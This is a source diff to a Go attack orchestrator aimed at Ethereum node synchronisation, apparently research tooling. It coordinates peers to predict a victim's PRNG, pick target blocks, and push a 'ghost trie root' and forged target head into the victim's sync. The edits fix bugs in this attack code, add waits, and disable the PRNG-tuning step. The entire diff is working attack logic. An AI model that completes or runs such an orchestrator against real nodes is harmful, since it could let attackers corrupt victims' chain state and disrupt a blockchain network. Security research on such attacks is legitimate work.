@@ -7,10 +7,7 @@ import "sync"
 import "bytes"
 import "math"
 import "encoding/binary"
-import "strconv"
-import "strings"
 import "os"
-import "os/exec"
 import mrand "math/rand"
 import dircopy "github.com/otiai10/copy"
 import "github.com/ethereum/go-ethereum/rlp"
@@ -313,8 +310,8 @@ func (o *Orchestrator) leadAttack() {
 	o.syncCh <- struct{}{}	// Announce PRNG has been initialised
 
 	<-o.syncCh				// Wait for blockX, blockY to be found
-	fmt.Println("Found x, y =", o.blockX, ",", blockY)
-	fmt.Println("Set target head: ", o.targetHead)
+	fmt.Printf("Found x, y = %d, %d\n", o.blockX, o.blockY)
+	fmt.Println("Set target head:", o.targetHead)
 
 	<-o.syncCh				// Wait for first syncOp of sync phase to start
 	/*
@@ -326,6 +323,11 @@ func (o *Orchestrator) leadAttack() {
 
 	// --- SYNC PHASE ---
 
+	// Wait for the master peer which will commit the ghost trie root before asking
+	// the master for its working directory
+	for o.syncOps != o.requiredOracleBits + 2 {
+		time.Sleep(5*time.Second)
+	}
 	err := o.send(o.peerset.masterPeer, msg.GetCwd)
 	if err != nil {
 		fmt.Println("Couldn't get current working directory of master peer")
@@ -333,9 +335,11 @@ func (o *Orchestrator) leadAttack() {
 		return
 	}
 
+	fmt.Println("Stepping done")
+
 	// TODO: Tune the PRNG
 
-	<-o.prngTuned
+	//<-o.prngTuned
 
 	/*
 	// Now, account for next 11 honest batches
@@ -574,14 +578,12 @@ func (o *Orchestrator) handleMessages() {
 					o.attackPhase = attackPhase
 					fmt.Println("Started", o.attackPhase, "phase")
 				}
-				go func() {
-					err := o.sendAllExcept(message, sender)
-					if err != nil {
-						o.errc <- err
-						o.close()
-						return
-					}
-				}()
+				err := o.sendAllExcept(message, sender)
+				if err != nil {
+					o.errc <- err
+					o.close()
+					return
+				}
 			case msg.OracleBit.Code:
 				o.oracleCh <- message.Content[0]
 
@@ -634,7 +636,7 @@ func (o *Orchestrator) handleMessages() {
 						o.prngSteps[1]++
 					}
 					fmt.Printf("PRNG synced with victim (100: %d, 1: %d)\n", o.prngSteps[100], o.prngSteps[1])
-					o.prngTuned <- struct{}{}
+					//o.prngTuned <- struct{}{}
 				}()
 			case msg.OriginalHead.Code:
 				size := uint64(len(message.Content))
@@ -660,6 +662,11 @@ func (o *Orchestrator) handleMessages() {
 					fmt.Printf("Pre-built DAG at block #%d\n", height)
 				}()
 				go func() {
+					// Wait for the peer's working directory
+					for !buildchain.MgethDirSet() {
+						time.Sleep(time.Second)
+					}
+
 					// Wait for ghost root, otherwise peer's database may undergo write operations while
 					// copying it to buildchain directory, resulting in an inconsistent state
 					for !buildchain.GhostRootSet() {
@@ -706,7 +713,7 @@ func (o *Orchestrator) handleMessages() {
 			case msg.CurrentHead.Code:
 				go func() {
 					currentHead := int(binary.BigEndian.Uint64(message.Content))
-					n := math.Ceil(float64(currentHead+60)/192.0) + 1
+					n := int(math.Ceil(float64(currentHead+60)/192.0)) + 1
 					<-o.syncCh		// Wait for PRNG initialisation
 					for i := 0; i < 2*n; i++ {
 						o.rand.Intn(100)
@@ -719,8 +726,8 @@ func (o *Orchestrator) handleMessages() {
 					y := 0
 					for (y >= 170 || y-x <= 160) {
 						C++
-						x := o.rand.Intn(100)
-						y := 100 + o.rand.Intn(100)
+						x = o.rand.Intn(100)
+						y = 100 + o.rand.Intn(100)
 					}
 					o.blockX = x
 					o.blockY = y
@@ -729,7 +736,7 @@ func (o *Orchestrator) handleMessages() {
 
 					content := make([]byte, 4)
 					binary.BigEndian.PutUint32(content, uint32(C))
-					err := sendAll(msg.SteppingBatches.SetContent(content))
+					err := o.sendAll(msg.SteppingBatches.SetContent(content))
 					if err != nil {
 						fmt.Println("Could not send number of stepping batches to peers")
 						o.errc <- err
@@ -738,7 +745,7 @@ func (o *Orchestrator) handleMessages() {
 					}
 					content = make([]byte, 8)
 					binary.BigEndian.PutUint64(content, uint64(o.targetHead))
-					err = sendAll(msg.TargetHead.SetContent(content))
+					err = o.sendAll(msg.TargetHead.SetContent(content))
 					if err != nil {
 						fmt.Println("Could not send target head to peers")
 						o.errc <- err
